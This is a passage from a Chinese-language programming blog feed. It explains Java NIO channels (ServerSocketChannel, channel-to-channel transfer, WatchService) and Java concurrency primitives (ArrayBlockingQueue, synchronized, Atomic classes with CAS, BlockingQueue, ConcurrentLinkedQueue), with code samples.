<h4 id="read"><a href="#read" class="headerlink" title="read()"></a>read()</h4><p>非阻塞模式下,read()方法在尚未读取到任何数据时可能就返回了。所以需要关注它的int返回值，它会告诉你读取了多少字节。</p>
<h3 id="非阻塞模式与选择器"><a href="#非阻塞模式与选择器" class="headerlink" title="非阻塞模式与选择器"></a>非阻塞模式与选择器</h3><p>非阻塞模式与选择器搭配会工作的更好，通过将一或多个SocketChannel注册到Selector，可以询问选择器哪个通道已经准备好了读取，写入等。Selector与SocketChannel的搭配使用会在后面详讲。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>NIO</category>
      </categories>
      <tags>
        <tag>JAVA NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA NIO之ServerSocketChannel</title>
    <url>/blog/plang/java/nio/sschannel/</url>
    <content><![CDATA[<p>Java NIO中的 ServerSocketChannel 是一个可以监听新进来的TCP连接的通道,就像标准IO中的ServerSocket一样。ServerSocketChannel类在java.nio.channels包中。</p>
<p>这里有个例子：</p>
<pre><code>ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();

serverSocketChannel.socket().bind(new InetSocketAddress(9999));

while(true)&#123;
    SocketChannel socketChannel =
            serverSocketChannel.accept();

    //do something with socketChannel...
&#125;
</code></pre>
<h3 id="打开-ServerSocketChannel"><a href="#打开-ServerSocketChannel" class="headerlink" title="打开 ServerSocketChannel"></a>打开 ServerSocketChannel</h3><p>通过调用 ServerSocketChannel.open() 方法来打开ServerSocketChannel.如：</p>
<pre><code>ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();
</code></pre>
<h3 id="关闭-ServerSocketChannel"><a href="#关闭-ServerSocketChannel" class="headerlink" title="关闭 ServerSocketChannel"></a>关闭 ServerSocketChannel</h3><p>通过调用ServerSocketChannel.close() 方法来关闭ServerSocketChannel. 如：</p>
<pre><code>serverSocketChannel.close();
</code></pre>
<h3 id="监听新进来的连接"><a href="#监听新进来的连接" class="headerlink" title="监听新进来的连接"></a>监听新进来的连接</h3><p>通过 ServerSocketChannel.accept() 方法监听新进来的连接。当accept()方法返回的时候,它返回一个包含新进来的连接的 SocketChannel。因此,accept()方法会一直阻塞到有新连接到达。</p>
<p>通常不会仅仅只监听一个连接,在while循环中调用 accept()方法.</p>
<p>如下面的例子：</p>
<pre><code>while(true)&#123;
    SocketChannel socketChannel =
            serverSocketChannel.accept();

    //do something with socketChannel...
&#125;
</code></pre>
<p>当然,也可以在while循环中使用除了true以外的其它退出准则。</p>
<h3 id="非阻塞模式"><a href="#非阻塞模式" class="headerlink" title="非阻塞模式"></a>非阻塞模式</h3><p>ServerSocketChannel可以设置成非阻塞模式。在非阻塞模式下，accept()方法会立刻返回，如果还没有新进来的连接,返回的将是null。</p>
<p>因此，需要检查返回的SocketChannel是否是null.如：</p>
<pre><code>ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();

serverSocketChannel.socket().bind(new InetSocketAddress(9999));
serverSocketChannel.configureBlocking(false);

while(true)&#123;
    SocketChannel socketChannel =
            serverSocketChannel.accept();

    if(socketChannel != null)&#123;
        //do something with socketChannel...
    &#125;
&#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>NIO</category>
      </categories>
      <tags>
        <tag>JAVA NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA NIO之通道之间的数据传输</title>
    <url>/blog/plang/java/nio/transferx/</url>
    <content><![CDATA[<p>在Java NIO中，如果两个通道中有一个是FileChannel，那你可以直接将数据从一个channel（译者注：channel中文常译作通道）传输到另外一个channel。</p>
<p><strong>transferFrom()</strong></p>
<p>FileChannel的transferFrom()方法可以将数据从源通道传输到FileChannel中（译者注：这个方法在JDK文档中的解释为将字节从给定的可读取字节通道传输到此通道的文件中）。下面是一个简单的例子：</p>
<pre><code>RandomAccessFile fromFile = new RandomAccessFile(&quot;fromFile.txt&quot;, &quot;rw&quot;);
FileChannel      fromChannel = fromFile.getChannel();

RandomAccessFile toFile = new RandomAccessFile(&quot;toFile.txt&quot;, &quot;rw&quot;);
FileChannel      toChannel = toFile.getChannel();

long position = 0;
long count = fromChannel.size();

toChannel.transferFrom(position, count, fromChannel);
</code></pre>
<p>方法的输入参数position表示从position处开始向目标文件写入数据，count表示最多传输的字节数。如果源通道的剩余空间小于count 个字节，则所传输的字节数要小于请求的字节数。</p>
<p>此外要注意，在SoketChannel的实现中，SocketChannel只会传输此刻准备好的数据（可能不足count字节）。因此，SocketChannel可能不会将请求的所有数据(count个字节)全部传输到FileChannel中。</p>
<p><strong>transferTo()</strong></p>
<p>transferTo()方法将数据从FileChannel传输到其他的channel中。下面是一个简单的例子：</p>
<pre><code>RandomAccessFile fromFile = new RandomAccessFile(&quot;fromFile.txt&quot;, &quot;rw&quot;);
FileChannel      fromChannel = fromFile.getChannel();

RandomAccessFile toFile = new RandomAccessFile(&quot;toFile.txt&quot;, &quot;rw&quot;);
FileChannel      toChannel = toFile.getChannel();

long position = 0;
long count = fromChannel.size();

fromChannel.transferTo(position, count, toChannel);
</code></pre>
<p>是不是发现这个例子和前面那个例子特别相似？除了调用方法的FileChannel对象不一样外，其他的都一样。</p>
<p>上面所说的关于SocketChannel的问题在transferTo()方法中同样存在。SocketChannel会一直传输数据直到目标buffer被填满。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>NIO</category>
      </categories>
      <tags>
        <tag>JAVA NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA NIO2之WatchService变更通知</title>
    <url>/blog/plang/java/nio/watchservice/</url>
    <content><![CDATA[<p>WatchService变更通知是在JDK7加入的新nio特性，可以监听文件系统的各种事件。</p>
<pre><code>import java.nio.file.attribute.*; 
 import java.io.*; 
 import java.util.*; 
 import java.nio.file.Path; 
 import java.nio.file.Paths; 
 import java.nio.file.StandardWatchEventKinds; 
 import java.nio.file.WatchEvent; 
 import java.nio.file.WatchKey; 
 import java.nio.file.WatchService; 
 import java.util.List; 
  
 public class Watcher &#123; 
     public static void main(String[] args) &#123; 
         Path this_dir = Paths.get(&quot;.&quot;);     
         System.out.println(&quot;Now watching the current directory ...&quot;);   
  
         try &#123; 
             WatchService watcher = this_dir.getFileSystem().newWatchService(); 
             this_dir.register(watcher, StandardWatchEventKinds.ENTRY_CREATE); 
  
             WatchKey watckKey = watcher.take(); 
  
             List events = watckKey.pollEvents(); 
             for (WatchEvent event : events) &#123; 
                 System.out.println(&quot;Someone just created the file &#39;&quot; + event.context().toString() + &quot;&#39;.&quot;); 
  
            &#125; 
  
        &#125; catch (Exception e) &#123; 
            System.out.println(&quot;Error: &quot; + e.toString()); 
        &#125; 
     &#125; 
 &#125;
</code></pre>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>NIO</category>
      </categories>
      <tags>
        <tag>JAVA NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA同步之ArrayBlockingQueue</title>
    <url>/blog/plang/java/threadsafe/arrayblockqueue/</url>
    <content><![CDATA[<p>ArrayBlockingQueue内容是一个数组容器，通过一个ReentrantLock控制数据的插入与删除。下面看一下源码，很简单。</p>
<h2 id="java-util-concurrent-ArrayBlockingQueue"><a href="#java-util-concurrent-ArrayBlockingQueue" class="headerlink" title="java.util.concurrent.ArrayBlockingQueue"></a>java.util.concurrent.ArrayBlockingQueue</h2><pre><code>public class ArrayBlockingQueue&lt; e&gt; extends AbstractQueue&lt; e&gt; implements BlockingQueue&lt; e&gt;, java.io.Serializable &#123;
    ...
    /** Main lock guarding all access */
    private final ReentrantLock lock;

    /** Condition for waiting takes */
    private final Condition notEmpty;

    /** Condition for waiting puts */
    private final Condition notFull;

    ...
    public ArrayBlockingQueue(int capacity, boolean fair) &#123;
        if (capacity &lt;= 0)
            throw new IllegalArgumentException();
        this.items = (E[]) new Object[capacity];
        lock = new ReentrantLock(fair);
        notEmpty = lock.newCondition();
        notFull =  lock.newCondition();
    &#125;

    public void put(E e) throws InterruptedException &#123;
        if (e == null) throw new NullPointerException();
        final E[] items = this.items;
        final ReentrantLock lock = this.lock;
        lock.lockInterruptibly();
        try &#123;
            try &#123;
                while (count == items.length)
                    notFull.await();
            &#125; catch (InterruptedException ie) &#123;
                notFull.signal(); // propagate to non-interrupted thread
                throw ie;
            &#125;
            insert(e);
        &#125; finally &#123;
            lock.unlock();
        &#125;
    &#125;

    private void insert(E x) &#123;
        items[putIndex] = x;
        putIndex = inc(putIndex);
        ++count;
        notEmpty.signal();
    &#125;

    public E take() throws InterruptedException &#123;
        final ReentrantLock lock = this.lock;
        lock.lockInterruptibly();
        try &#123;
            try &#123;
                while (count == 0)
                    notEmpty.await();
            &#125; catch (InterruptedException ie) &#123;
                notEmpty.signal(); // propagate to non-interrupted thread
                throw ie;
            &#125;
            E x = extract();
            return x;
        &#125; finally &#123;
            lock.unlock();
        &#125;
    &#125;

    private E extract() &#123;
        final E[] items = this.items;
        E x = items[takeIndex];
        items[takeIndex] = null;
        takeIndex = inc(takeIndex);
        --count;
        notFull.signal();
        return x;
    &#125;
    ...
&#125;
</code></pre>
<p>这里notEmpty和notFull作为lock的两个条件，分别负责管理想要加入元素的线程和想要取出元素的线程的wait和notify，通过await()、signal()、signalAll()方法，有效的分离了不同职责的线程。</p>
<p>例如put()方法在元素个数达到最大限制时会使用notFull条件把试图继续插入元素的线程都扔到等待集中，而执行了take()方法时如果顺利进入extract()则会空出空间，这时notFull负责随机的通知被其扔到等待集中的线程执行插入元素的操作。这样的设计使得线程按照功能行为职责管理成为了现实。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA同步设计败笔synchronized</title>
    <url>/blog/plang/java/threadsafe/bbsynchronized/</url>
    <content><![CDATA[<h2 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h2><p>JAVA同步关键字，JAVA语法的一大败笔。</p>
<p>所有学JAVA线程安全的同学都要求记住synchronized锁住的是对象。</p>
<p>我就来说说这玩意坑了多少人，我也是被坑人之一。</p>
<h2 id="统一synchronized两种形式"><a href="#统一synchronized两种形式" class="headerlink" title="统一synchronized两种形式"></a>统一synchronized两种形式</h2><p>synchronized加锁有两种方式，一种加方法上，一种加对象上。加在方法上可以转换为加在对象上。</p>
<p>加方法上：</p>
<pre><code>    public synchronized void method() &#123;
        //此处还有n行代码
    &#125;
</code></pre>
<p>加对象上:</p>
<pre><code>    public void method() &#123;
        synchronized (this) &#123;
            // 此处还有n行代码
        &#125;
    &#125;
</code></pre>
<p>加方法上可以看成是一种语法糖，最终还是加对象上。</p>
<h2 id="真的锁住对象了吗？"><a href="#真的锁住对象了吗？" class="headerlink" title="真的锁住对象了吗？"></a>真的锁住对象了吗？</h2><p>看下面一个例子：</p>
<pre><code>/**
 * TestThread
 * @author douzh
 * @version 1.0
 *
 */
public class TestThread &#123;
    public static void main(String[] args) &#123;
        final SyncObject o=new SyncObject();
        new Thread(new Runnable() &#123;
            @Override
            public void run() &#123;
                System.out.println(&quot;syncget:&quot;+o.syncGet());
            &#125;
        &#125;).start();
        new Thread(new Runnable() &#123;
            @Override
            public void run() &#123;
                System.out.println(&quot;get:&quot;+o.get());
            &#125;
        &#125;).start();
    &#125;
&#125;

class SyncObject &#123;
    private int i = 100;

    public int get()&#123;
        return i;
    &#125;
    public synchronized int syncGet()&#123;
        System.out.println(&quot;syncget&quot;);
        try &#123;
            Thread.sleep(2000);
        &#125; catch (InterruptedException e) &#123;
            e.printStackTrace();
        &#125;
        return i;
    &#125;
&#125;
</code></pre>
<p>实际上非synchronized方法任何时候都可以访问。所以锁住的不是对象。</p>
<h2 id="锁的本意"><a href="#锁的本意" class="headerlink" title="锁的本意"></a>锁的本意</h2><p>线程安全问题的本质是“实现原子操作的原子性”，原子操作其实是一段代码，锁的本质是保证同一时间只有一个线程可以进入这段代码。</p>
<pre><code>所以锁是这样的形式：

lock.lock();
//我是一个代码块
lock.unlock();
</code></pre>
<p>那JAVA中synchronized怎么理解呢？</p>
<p>我理解synchronized(lockObject)是对lockObject添加了锁功能。因为JAVA初期没有实现LOCK对象，所以弄了这么个东西。</p>
<p>这个东西太可恶了，混淆了数据对象和锁对象，曲解了好多线程安全概念。</p>
<p>JAVA 1.5加入正式的锁后，建议不要用synchronized这东西了，但坑害的人太多了，一时改不过来。</p>
<p>记住：锁只能锁代码块，代码块应该是一个原子操作。</p>
<p>附一点大学课本的知识：</p>
<p>临界区指的是一个访问共用资源（例如：共用设备或是共用存储器）的程序片段，而这些共用资源又无法同时被多个线程访问。当有线程进入临界区段时，其他线程或是进程必须等待，有一些同步的机制必须在临界区段的进入点与离开点实现，以确保这些共用资源是被互斥获得使用。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA同步之Atomic类的使用</title>
    <url>/blog/plang/java/threadsafe/atomic/</url>
    <content><![CDATA[<h2 id="CAS"><a href="#CAS" class="headerlink" title="CAS"></a>CAS</h2><p>要想理解java.util.concurrent.atomic包的原子类的原理和使用，先要理解CAS(Compare-And-Swap比较并交换)的概念。</p>
<p>现在大多数的处理器都提供对并发访问的支持，这个支持的反映方式就是提供硬件的指令支持多处理的特殊需求。比如检测或者阻止其它处理器的并发访问来更新共享变量的指令。</p>
<p>对于Intel x86架构的处理器来说就是通过提供实现CAS或者比较并设置的硬件原语指令集。CAS操作的三个操作数：内存位置（V），预期原值（A）和新值（B）。执行的过程通常是：预测内存地址V应该包含值A，如果包含则将值B替换到位置V；否则，不更改任何值，告知地址V的当前值。CAS对待“读－修改－写”的操作一般是检测这个过程是否有其它的线程在修改变量，如果有那么这次的CAS操作失败，可以尝试重新进行CAS。</p>
<h2 id="原子类"><a href="#原子类" class="headerlink" title="原子类"></a>原子类</h2><p>JDK5以后在java.util.concurrent.atomic包下提供了十几个原子类。常见的是AtomicInteger,AtomicLong,AtomicReference以及它们的数组形式，还有AtomicBoolean和为了处理ABA问题引入的AtomicStampedReference类，最后就是基于反射的对volatile变量进行更新的实用工具类：AtomicIntegerFieldUpdater,AtomicLongFieldUpdater,AtomicReferenceFieldUpdater。这些原子类理论上能够大幅的提升性能。并且java.util.concurrent内的并发集合，线程池，执行器，同步器的内部实现大量的依赖这些无锁原子类，从而争取性能的最大化。</p>
<p>原子类的核心方法是一个叫compareAndSet的方法，比如AtomicInteger的：</p>
<pre><code> public final boolean compareAndSet(int expect, int update) &#123;
    return unsafe.compareAndSwapInt(this, valueOffset, expect, update);
    &#125;
</code></pre>
<p>如果当前真实值为expect，那就更新其为update，成功返回true，失败返回false。</p>
<p>让我们看年compareAndSet怎么使用，也以AtomicInteger里的方法为例：</p>
<pre><code>    public final int addAndGet(int delta) &#123;
        for (;;) &#123;
            int current = get();
            int next = current + delta;
            if (compareAndSet(current, next))
                return next;
        &#125;
    &#125;
</code></pre>
<p>addAndGet方法会给当前值加上delta，然后返回相加的值。他是如何保证“读-修改-写”的原子性的呢？</p>
<p>看代码可知，读和修改后，写会用compareAndSet，如果读和修改后在写之前，有其它线程改变了真实值，那current就和内存的值不一样了，这样会返回false，那return就不会执行，for循环会再来一次“读-修改-写”操作。直到成功完成操作，返回修改后的值。</p>
<p>原子类都是用这种方式修改值的，这样就保证了“读-修改-写”的原子性，这就是CAS的用途。</p>
<h2 id="一个例子："><a href="#一个例子：" class="headerlink" title="一个例子："></a>一个例子：</h2><pre><code>import java.util.concurrent.atomic.AtomicIntegerFieldUpdater;
import java.util.concurrent.atomic.AtomicInteger;
</code></pre>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AtomicCounterSample</span> <span class="keyword">extends</span> <span class="title class_">Thread</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> AtomicCounter atomicCounter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AtomicCounterSample</span><span class="params">(AtomicCounter atomicCounter)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.atomicCounter = atomicCounter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">long</span> <span class="variable">sleepTime</span> <span class="operator">=</span> (<span class="type">long</span>) (Math.random() * <span class="number">100</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(sleepTime);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        atomicCounter.counterIncrement();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">AtomicCounter</span> <span class="variable">atomicCounter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicCounter</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">5000</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">AtomicCounterSample</span>(atomicCounter).start();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Thread.sleep(<span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;counter=&quot;</span> + atomicCounter.getCounter());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AtomicCounter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">AtomicInteger</span> <span class="variable">counter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCounter</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> counter.get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">counterIncrement</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (; ;) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">current</span> <span class="operator">=</span> counter.get();</span><br><span class="line">            <span class="type">int</span> <span class="variable">next</span> <span class="operator">=</span> current + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (counter.compareAndSet(current, next))</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AtomicCounter2</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">int</span> counter;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> AtomicIntegerFieldUpdater&lt; atomiccounter2&gt; counterUpdater</span><br><span class="line">             = AtomicIntegerFieldUpdater.newUpdater(AtomicCounter2.class, <span class="string">&quot;counter&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCounter</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> counter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">counterIncrement</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">//        return counter++;</span></span><br><span class="line">        <span class="keyword">return</span> counterUpdater.getAndIncrement(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个例子实现了原子计数器的两个版本：AtomicCounter，AtomicCounter2。AtomicCounterSample作为Thread的子类对共享变量AtomicCounter或者AtomicCounter2内的counter变量进行增幅为1的递增。主函数的过程是开启5000线程，并且每个线程随机睡眠极短时间后执行递增。所以线程安全的执行结果应该是5000。</p>
<p>首先看版本1：AtomicCounter内的共享变量使用了Integer的原子类代替，在get()方法中不使用锁，也不用担心获取的过程中别的线程去改变counter的值，因为这些原子类可以看成volatile的范化扩展，可见性能够保证。而在counterIncrement()方法中揭示了使用原子类的重要技巧：循环结合CAS。这个技巧可以帮助我们实现复杂的非阻塞并发集合。方法中的counter.compareAndSet(current,next)就是原子类使用的精髓－－CAS操作。compareAndSet(…)可以说是原子类搭积木的原材料，在循环中使用它可以让我们的并发程序昂首挺胸。</p>
<p>再看版本2：AtomicCounter2内有个volatile的共享变量counter，并且有个类变量counterUpdater作为counter的更新器。在counterIncrement()里注释掉的代码是非线程安全的。而counterUpdater.getAndIncrement(this)的内部实现其实和版本1的几乎一样。唯一不同的是通过反射找到要原子操作更新的变量counter，但是“循环+CAS”的精髓是一样的。</p>
<p>最后看看结果吧：版本1和版本2的无锁同步的执行分别20次均是5000，正确。版本2把无锁同步的代码注释，把已注释的非线程安全的代码还原执行，平均每10次大概有1～2次出现&lt;5000的数字。这个例子侧面证明了++的原子性操作非线程安全是保证不了的。因为“读－修改－写”的操作碰到如下场景：线程A“读－修改”后“写”之前，线程B完成“读－修改－写”。这时候A,B的写值是重复的，这就造成了结果&lt;5000，又杯具了…</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA同步之线程安全队列Queue</title>
    <url>/blog/plang/java/threadsafe/blockingqueue/</url>
    <content><![CDATA[<p>Java提供的线程安全的Queue可以分为阻塞队列和非阻塞队列，其中阻塞队列的典型例子是BlockingQueue，非阻塞队列的典型例子是ConcurrentLinkedQueue，在实际应用中要根据实际需要选用阻塞队列或者非阻塞队列。</p>
<p>BlockingQueue是个接口，顾名思义，“阻塞队列”：可以提供阻塞功能的队列。具体实现类有以下三个：</p>
<ul>
<li>ArrayBlockingQueue，其构造函数必须带一个int参数来指明其大小</li>
<li>LinkedBlockingQueue，若其构造函数带一个规定大小的参数，生成的BlockingQueue有大小限制，若不带大小参数，所生成的BlockingQueue的大小由Integer.MAX_VALUE来决定</li>
<li>PriorityBlockingQueue，其所含对象的排序不是FIFO,而是依据对象的自然排序顺序或者是构造函数的Comparator决定的顺序</li>
</ul>
<table>
<thead>
<tr>
<th>?功能</th>
<th>可能报异常</th>
<th>返回布尔值</th>
<th>可能阻塞</th>
<th>设定等待时间</th>
</tr>
</thead>
<tbody><tr>
<td>入队</td>
<td>add(e)</td>
<td>offer(e)</td>
<td>put(e)</td>
<td>offer(e, timeout, unit)</td>
</tr>
<tr>
<td>出队</td>
<td>remove()</td>
<td>poll()</td>
<td>take()</td>
<td>poll(timeout, unit)</td>
</tr>
<tr>
<td>查看</td>
<td>element()</td>
<td>peek()</td>
<td>无</td>
<td>无</td>
</tr>
</tbody></table>
<p>从上表可以很明显看出每个方法的作用，这个不用多说。我想说的是：</p>
<p>add(e) remove() element()方法不会阻塞线程。当不满足约束条件时，会抛出IllegalStateException<br>异常。例如：当队列被元素填满后，再调用add(e)，则会抛出异常。</p>
<p>offer(e) poll() peek()方法即不会阻塞线程，也不会抛出异常。例如：当队列被元素填满后，再调用offer(e)，则不会插入元素，函数返回false。</p>
<p>要想要实现阻塞功能，需要调用put(e) take()方法。当不满足约束条件时，会阻塞线程。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA同步之ConcurrentLinkedQueue</title>
    <url>/blog/plang/java/threadsafe/concurrentlinkedqueue/</url>
    <content><![CDATA[<p>ConcurrentLinkedQueue充分使用了atomic包的实现打造了一个无锁得并发线程安全的队列。对比锁机制的实现，个人认为使用无锁机制的难点在于要充分考虑线程间的协调。简单的说就是多个线程对内部数据结构进行访问时，如果其中一个线程执行的中途因为一些原因出现故障，其他的线程能够检测并帮助完成剩下的操作。这就需要把对数据结构的操作过程精细的划分成多个状态或阶段，考虑每个阶段或状态多线程访问会出现的情况。上述的难点在此次分析的并发Queue的实现中有很好的说明。首先看看其部分源码：</p>
<pre><code>public class ConcurrentLinkedQueue&lt; E&gt; extends AbstractQueue&lt; E&gt;
        implements Queue&lt; E&gt;, java.io.Serializable &#123;
    private static final long serialVersionUID = 196745693267521676L;

    private static class Node&lt; E&gt; &#123;
        private volatile E item;
        private volatile Node&lt; E&gt; next;
        private static final
            AtomicReferenceFieldUpdater&lt; node node=&quot;&quot;&gt;
            nextUpdater =
            AtomicReferenceFieldUpdater.newUpdater
            (Node.class, Node.class, &quot;next&quot;);
        private static final
            AtomicReferenceFieldUpdater&lt; node object=&quot;&quot;&gt;
            itemUpdater =
            AtomicReferenceFieldUpdater.newUpdater
            (Node.class, Object.class, &quot;item&quot;);

        Node(E x) &#123; item = x; &#125;

        Node(E x, Node&lt; E&gt; n) &#123; item = x; next = n; &#125;

        E getItem() &#123;
            return item;
        &#125;

        boolean casItem(E cmp, E val) &#123;
            return itemUpdater.compareAndSet(this, cmp, val);
        &#125;

        void setItem(E val) &#123;
            itemUpdater.set(this, val);
        &#125;

        Node&lt; e&gt; getNext() &#123;
            return next;
        &#125;

        boolean casNext(Node&lt; E&gt; cmp, Node&lt; E&gt; val) &#123;
            return nextUpdater.compareAndSet(this, cmp, val);
        &#125;

        void setNext(Node&lt; E&gt; val) &#123;
            nextUpdater.set(this, val);
        &#125;

    &#125;

    private static final
        AtomicReferenceFieldUpdater&lt; concurrentlinkedqueue node=&quot;&quot;&gt;
        tailUpdater =
        AtomicReferenceFieldUpdater.newUpdater
        (ConcurrentLinkedQueue.class, Node.class, &quot;tail&quot;);
    private static final
        AtomicReferenceFieldUpdater&lt; concurrentlinkedqueue node=&quot;&quot;&gt;
        headUpdater =
        AtomicReferenceFieldUpdater.newUpdater
        (ConcurrentLinkedQueue.class,  Node.class, &quot;head&quot;);

    private boolean casTail(Node&lt; E&gt; cmp, Node&lt; E&gt; val) &#123;
        return tailUpdater.compareAndSet(this, cmp, val);
    &#125;

    private boolean casHead(Node&lt; E&gt; cmp, Node &lt; e&gt; val) &#123;
        return headUpdater.compareAndSet(this, cmp, val);
    &#125;

    private transient volatile Node &lt; e&gt; head = new Node&lt; E&gt;(null, null);

    private transient volatile Node&lt; E&gt; tail = head;
    ...
&#125;
</code></pre>
<p>先看看其内部数据结构Node的实现。由于使用了原子字段更新器AtomicReferenceFieldUpdater&lt;t v&gt;（其中T表示持有字段的类的类型，V表示字段的类型），所以其对应的需要更新的字段要使用volatile进行声明。其newUpdater(Class&lt;u&gt; tclass, Class&lt; w&gt; vclass, String fieldName)方法实例化一个指定字段的更新器，参数分别表示：持有需要更新字段的类，字段的类，要更新的字段的名称。Node的内部变量item，next分别有对应自己的字段更新器，并且包含了对其原子性操作的方法compareAndSet(T obj, V expect, V update)，其中T是持有被设置字段的对象，后两者分别是期望值和新值。</p>
<p>对于ConcurrentLinkedQueue自身也有两个volatile的线程共享变量：head，tail分别对应队列的头指针和尾指针。要保证这个队列的线程安全就是保证对这两个Node的引用的访问（更新，查看）的原子性和可见性，由于volatile本身能够保证可见性，所以就是对其修改的原子性要被保证。下面看看其对应的方法是如何完成的。</p>
<pre><code>    public boolean offer(E e) &#123;
        if (e == null) throw new NullPointerException();
        Node&lt; e&gt; n = new Node&lt; e&gt;(e, null);
        for (;;) &#123;
            Node&lt; e&gt; t = tail;
            Node&lt; e&gt; s = t.getNext();
            if (t == tail) &#123; //------------------------------a
                if (s == null) &#123; //---------------------------b
                    if (t.casNext(s, n)) &#123; //-------------------c
                        casTail(t, n); //------------------------d
                        return true;
                    &#125;
                &#125; else &#123;
                    casTail(t, s); //----------------------------e
                &#125;
            &#125;
        &#125;
    &#125;
</code></pre>
<p>offer()方法都很熟悉了，就是入队的操作。涉及到改变尾指针的操作，所以要看这个方法实现是否保证了原子性。CAS操作配合循环是原子性操作的保证，这里也不例外。此方法的循环内首先获得尾指针和其next指向的对象，由于tail和Node的next均是volatile的，所以保证了获得的分别都是最新的值。</p>
<p>代码a：t&#x3D;&#x3D;tail是最上层的协调，如果其他线程改变了tail的引用，则说明现在获得不是最新的尾指针需要重新循环获得最新的值。</p>
<p>代码b：s&#x3D;&#x3D;null的判断。静止状态下tail的next一定是指向null的，但是多线程下的另一个状态就是中间态：tail的指向没有改变，但是其next已经指向新的结点，即完成tail引用改变前的状态，这时候s!&#x3D;null。这里就是协调的典型应用，直接进入代码e去协调参与中间态的线程去完成最后的更新，然后重新循环获得新的tail开始自己的新一次的入队尝试。另外值得注意的是a,b之间，其他的线程可能会改变tail的指向，使得协调的操作失败。从这个步骤可以看到无锁实现的复杂性。</p>
<p>代码c：t.casNext(s, n)是入队的第一步，因为入队需要两步：更新Node的next，改变tail的指向。代码c之前可能发生tail引用指向的改变或者进入更新的中间态，这两种情况均会使得t指向的元素的next属性被原子的改变，不再指向null。这时代码c操作失败，重新进入循环。</p>
